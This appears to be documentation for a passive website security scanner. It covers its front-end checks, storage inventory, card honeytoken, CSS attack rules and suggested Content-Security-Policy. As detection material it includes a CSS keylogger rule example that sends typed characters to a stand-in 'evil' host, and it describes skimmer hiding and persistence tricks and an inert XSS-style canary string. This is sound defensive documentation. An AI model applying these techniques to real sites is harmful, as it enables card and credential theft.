# Security checks

Besides detecting compromise ([How it works](how-it-works.md)), every scan checks the page's front-end security: the weaknesses that make XSS, skimming and data leaks easier, and where they'd come from. These are **passive**: they read what the normal visit already received, and send nothing extra to the site. The one exception is the opt-in DOM-XSS canary, and even that sends nothing to the server.

The scanner is a monitor, not a penetration tester. It doesn't inject attack payloads into forms or parameters. For active XSS or injection testing, use a DAST tool such as OWASP ZAP or Burp, with the site owner's authorization.

Severities are deliberately low. These are weaknesses, not signs of compromise, and they shouldn't bury a real skimmer. Like every rule, they can be turned off or re-levelled in [`config.json`](rules.md).

## Checks

| Rule | Severity | What it flags |
|---|---|---|
| `vulnerable-library` | medium / low / info | A library version with known vulnerabilities (jQuery, jQuery UI, Bootstrap, AngularJS, Lodash, Handlebars, DOMPurify and about 70 more). It's detected from the script URL, file name, a version banner in the code, or a known file hash, using the [Retire.js](https://github.com/RetireJS/retire.js) database. The finding lists the CVEs and advisory links. Retire.js critical/high → medium, medium → low, low → info |
| `mixed-content` | medium / low | An HTTPS page requesting resources over plain HTTP: medium for scripts, styles, frames, XHR/fetch and WebSockets, low for images and media |
| `card-data-in-storage` | high | The dummy card number the scanner typed was found in browser storage or a cookie, raw or encoded. See [Card-data honeytoken](#card-data-honeytoken) |
| `exposed-secret` | medium | Credentials that should never ship to a browser, in a format specific enough not to guess: private keys, AWS access key IDs, Braintree/PayPal access tokens, Square OAuth secrets, Shopify admin tokens, GitHub/Slack/SendGrid/Mailchimp/OpenAI/Anthropic keys. Masked in reports. (Stripe secret keys have their own high rule, `stripe-secret-key`) |
| `dom-xss-canary` | medium | Opt-in, see below. Text from the URL fragment was written into the page as HTML |
| `csp-missing` | low | No Content-Security-Policy |
| `csp-weak` | low | A CSP that doesn't restrict scripts, or allows `'unsafe-inline'` (only when no nonce, hash or `'strict-dynamic'` neutralises it, as browsers do), `'unsafe-eval'`, wildcards (`*`, `https:`) or `data:` |
| `hsts-missing` | low / info | No `Strict-Transport-Security` on an HTTPS page (info when present but `max-age` is under 180 days) |
| `clickjacking-unprotected` | low | No `X-Frame-Options` or CSP `frame-ancestors`, so any site can frame the page |
| `session-cookie-insecure` | low | A first-party session cookie readable by JavaScript (no `HttpOnly`) or sent without `Secure`. Only real session cookie names count: PHP, Java, .NET, Node, Laravel, Rails, Magento, WordPress/WooCommerce, Drupal, and generic `auth`/`token`/`jwt`. Analytics "session" cookies don't |
| `token-in-storage` | low | A JWT, or an `access_token`-style key, in `localStorage`/`sessionStorage`, where any script on the page can read it. Key names only; values are never stored |
| `sri-missing` | info / low | Third-party `<script src>` tags without Subresource Integrity. Low on pages that take card details (card fields, a payment-processor iframe, or a `/checkout`, `/payment` or `/donate` URL), info elsewhere. Scripts in `volatileScripts` are skipped, since they can't use SRI |
| `csp-report-only` | info | The CSP is report-only, so it blocks nothing |
| `nosniff-missing` | info | No `X-Content-Type-Options: nosniff` |
| `referrer-policy-missing` | info | No `Referrer-Policy`, or one that sends full URLs to other sites |
| `new-cookie` | info / low | A cookie not in the baseline. Low for third-party cookies set by JavaScript |
| `new-service-worker` | low | A service worker not in the baseline |
| `new-storage-key` | info | A `localStorage`/`sessionStorage` key not in the baseline |

Header and cookie findings are usually site-wide. In crawl and sitemap mode, each one is reported once per site, on the first page where it appears, with "also on N other pages".

## Cookie inventory

Every scan records every cookie in the browser after the visit: name, domain, first- or third-party, `HttpOnly`/`Secure`/`SameSite`, expiry, and **who set it**:

- **server:** a `Set-Cookie` response header (and every `HttpOnly` cookie, which scripts can't create).
- **JavaScript:** `document.cookie`. This is how analytics and ad tags work, and also how some skimmers stash data.
- **you (auth):** a cookie you supplied for a [logged-in scan](configuration.md#logged-in-scans).
- **cookie jar:** loaded from a [cookie file](configuration.md#cookie-jars) (`--cookie file`).
- **earlier page:** carried over from a previous page with [`--session site`](configuration.md#sessions-fresh-or-shared-cookies). With the default `--session page`, every page starts with no cookies.

The inventory is in the HTML report (under "Cookies") and `report.json`. Add `--show-cookies` to print it in the console. Values are never recorded. The baseline stores cookie names (with ID-like parts collapsed, so `_ga_ABC123` stays stable) and reports new ones as `new-cookie`.

## Browser storage inventory

Every scan also records what the page, and each iframe origin on it, left in browser storage:

| Storage | Recorded |
|---|---|
| `localStorage` / `sessionStorage` | Every key with its origin (first- or third-party iframe), size, **kind** (JSON, JWT, number, URL, UUID, hex or base64 blob, text), a short preview (70 characters, JWTs masked), and the **phase it was first written in**: page load, scroll, form input, a custom step… |
| IndexedDB | Databases, versions, object stores and record counts. They're opened read-only; nothing is created or upgraded. Up to 50 records per store are sampled for the checks below |
| Cache Storage | Cache names and entry counts. Cached script, CSS, HTML and JSON bodies are read for the checks below. A service worker can serve a tampered cached file on every visit |
| Service workers | Script URL, scope, state, and the worker's code (checked below). A service worker keeps running across visits and can rewrite responses |
| OPFS (Origin Private File System) | Files and sizes, with SQLite databases recognised. This is where in-browser SQL (SQLite compiled to WebAssembly) keeps its data; the old WebSQL `openDatabase` has been removed from Chrome. The first 1 MB of each file is checked |
| `window.name`, `history.state` | Size, kind and a preview. Both survive navigation, which makes them a known way to smuggle data or payloads |
| Storage Buckets | Bucket names (a newer Chrome API) |

Chrome's Shared Storage can't be read back by page code, so it isn't covered.

### Malicious code in storage

Every value above, plus cookie values, goes through the same checks as scripts:

- **Pattern rules** (skimmer, decoded `eval`, injected scripts, secrets…) on the value as stored, **and again after base64-decoding** when it decodes to readable text. Cached stylesheets also get the [CSS rules](#css). Findings name the place: `localStorage "payload_cache" (https://shop.example)`, `Cache Storage scripts-v1 https://shop.example/assets/boot.js`, `service worker https://shop.example/sw.js`, and so on.
- **`code-in-storage` (low):** JavaScript sitting in storage (`localStorage`, `sessionStorage`, IndexedDB, OPFS, `window.name`, `history.state` or a cookie), as stored or base64-encoded. Keeping a payload in storage and `eval`-ing it on later visits is a known persistence trick. Cache Storage and service workers hold code legitimately, so they only get the pattern rules.
- **The card honeytoken** (below).

It's in the HTML report (under "Browser storage") and `report.json`. Add `--show-storage` to print it in the console. Previews are short and masked, and full values are never stored unless you ask with `--show-values`.

### Seeing the values: `--show-values`

`--show-values` adds full cookie and storage values (plus IndexedDB record samples, `window.name` and `history.state`) to the lists you asked for (`--show-cookies` and/or `--show-storage`; both if you asked for neither) and to the HTML and JSON reports. Those reports then contain live values, so they carry a warning banner: treat them as sensitive and don't attach them to tickets as-is. Cookies **you** supplied (`--cookie`, cookie jars, storage state) stay masked even then.

The baseline records storage keys (ID-like parts collapsed) and service-worker scripts. New keys are noted as `new-storage-key` (info), and new service workers as `new-service-worker` (low).

### Card-data honeytoken

When the scanner fills forms, it types a **known dummy card number** (`4111111111111111`). After the visit it searches every storage value and cookie value for that number: as-is, spaced, URL-encoded, hex-encoded, base64-encoded (standard or URL-safe), double base64, or base64 of hex. If it's found, a script took what was typed into the card field and stashed it. That's how some skimmers stage stolen cards for a separate upload routine (Sansec's 2026 Stripe-C2 kit, for example).

This is reported as **`card-data-in-storage` (high)**, naming the storage type, key, origin and encoding. It catches the behavior however well the code is hidden, as long as the stash happens during the scan. Custom encryption (such as XOR with a key) isn't decoded.

## CSS

Stylesheets can attack without any JavaScript, so every external stylesheet and inline `<style>` is inventoried (with a hash, in the HTML report under "Stylesheets") and checked:

| Rule | Severity | Flags |
|---|---|---|
| `css-keylogger` | high | **CSS keylogger:** rules like `input[type=password][value$="a"] { background: url(https://evil/a) }` that load a URL per typed character. Fires at 5 or more such rules, or 1 on a password/card/email field |
| `css-hidden-payload` | medium | 5,000+ characters of mixed spaces and tabs: the Mr.SNIFFA way of hiding a skimmer inside a `.css` file |
| `css-script-url` | medium | `url(javascript:…)` or `url(data:text/javascript…)` |
| `css-legacy-code` | low | `expression()`, `behavior:` or `-moz-binding`: CSS that could run code in old browsers |
| `new-stylesheet` | low / info | A stylesheet not in the baseline (low for third-party) |
| `changed-stylesheet` | info | A stylesheet whose contents changed since the baseline |

Findings give the line and column. Across 210 stylesheets from popular libraries (Bootstrap, jQuery UI, Swiper, Select2, Flatpickr, Video.js…), none of these rules fired. Custom rules can target CSS too (`"target": "css"`, see [Rules](rules.md#custom-rules)).

## Suggested Content-Security-Policy

When a site has no CSP, a weak one or only a report-only one, the report includes a **suggested policy built from what the scanned pages actually loaded**. It appears under the CSP finding in the console, as a section under the site in the HTML and Markdown reports, and in `report.json` (`sites[].cspSuggestion`).

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'nonce-{SERVER-GENERATED}' 'self' https://www.googletagmanager.com https://*.shopify.com …;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://*.doubleclick.net …;
  connect-src 'self' https://analytics.google.com …;
  frame-src 'self' https://td.doubleclick.net;
  form-action 'self';
  frame-ancestors 'self';
  base-uri 'self';
  object-src 'none';
  upgrade-insecure-requests
```

How it's built:

- **Each directive is filled from real loads.** Scripts go in `script-src`, XHR, fetch, beacons and WebSockets in `connect-src`, iframes in `frame-src`, form targets in `form-action`, and so on, using exact origins (scheme, host, port). Four or more hosts under one domain collapse to `https://*.domain`.
- **Inline scripts** in the HTML are allowed by their exact `'sha256-…'` hash when there are few of them and they look stable. If any look like they change per request (IDs, timestamps), or there are many, it recommends a **nonce** instead. Scripts injected at runtime (usually by a tag manager) are called out, since they need the nonce passed along.
- **`'unsafe-eval'`** is only included when page code actually ran `eval`/`new Function` during the scan, with a note to remove that use. The scanner's own browser automation isn't counted.
- **Safe defaults** are always included: `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'self'` (clickjacking), and `upgrade-insecure-requests` on HTTPS sites.
- **It never loosens an existing policy.** If the site already sends a CSP, its `frame-ancestors`, reporting endpoints (`report-uri`/`report-to`) and any directive the scanner doesn't generate (`block-all-mixed-content`, `require-trusted-types-for`, `sandbox`…) are kept as they are.
- **In crawl and sitemap mode**, the suggestion covers every page scanned on the site.

It's a starting point. One anonymous visit doesn't see every page, login state or checkout step. Deploy it as `Content-Security-Policy-Report-Only` with a `report-to`/`report-uri` endpoint, fix or allow what gets reported, then switch to `Content-Security-Policy`. A nonce- and `'strict-dynamic'`-based policy is stronger still, but needs server changes.

## DOM-XSS canary (opt-in)

`--dom-xss-canary` (or `"domXssCanary": true` in `options` or a site) adds one extra page load per page. The URL gets an inert marker in its **fragment**:

```
https://shop.example.com/page#"'><scripthound-canary id="sh1a2b3c4d"></scripthound-canary>
```

The fragment (`#…`) is never sent to the server, so the site sees an ordinary page view. The scanner then checks whether the page's own scripts turned that text into a real HTML element, both on load and after a `hashchange`. If they did, some script reads `location.hash` and writes it as HTML: a DOM-based XSS sink. The finding names the element it landed in.

The marker is an empty custom element: it does nothing, runs nothing, and only exists in the scanner's own browser. It's off by default because it doubles page loads.

## Mapping to the OWASP Client-Side Top 10

| OWASP client-side risk | Coverage |
|---|---|
| DOM-based XSS | `dom-xss-canary` (opt-in), and pattern rules for injected or decoded scripts |
| Prototype pollution | Indirectly: known-vulnerable libraries (Lodash, jQuery…) via `vulnerable-library` |
| Sensitive data leakage | The skimmer and credential rules, exfiltration destinations, `exposed-secret` |
| Vulnerable and outdated components | `vulnerable-library` |
| Lack of third-party origin control | Script and domain inventory, new-domain findings, the GTM tree, `sri-missing` |
| JavaScript drift | Baseline diff, `changed-script` for first-party files too |
| Sensitive data stored client-side | `card-data-in-storage` (honeytoken), `code-in-storage`, pattern rules on every stored value, `token-in-storage`, `session-cookie-insecure`, the storage inventory, card-data stashing in code (skimmer rule) |
| Client-side security logging and monitoring | This tool, run on a schedule |
| Not using standard browser security controls | `csp-missing`/`csp-weak` (with a suggested policy), `hsts-missing`, `clickjacking-unprotected`, `nosniff-missing`, `referrer-policy-missing`, `mixed-content`, `sri-missing` |
| Including proprietary information client-side | `exposed-secret`, `stripe-secret-key`; add your own with [custom rules](rules.md#custom-rules) |

It also supports PCI DSS 4.0 **6.4.3** (inventory and integrity of payment-page scripts) and **11.6.1** (detecting changes to payment pages).

## Updating the vulnerability database

The Retire.js database is kept in the repo (`data/retire-jsrepository.json`) so scans work offline. Refresh it from time to time:

```bash
make update-vulndb
```
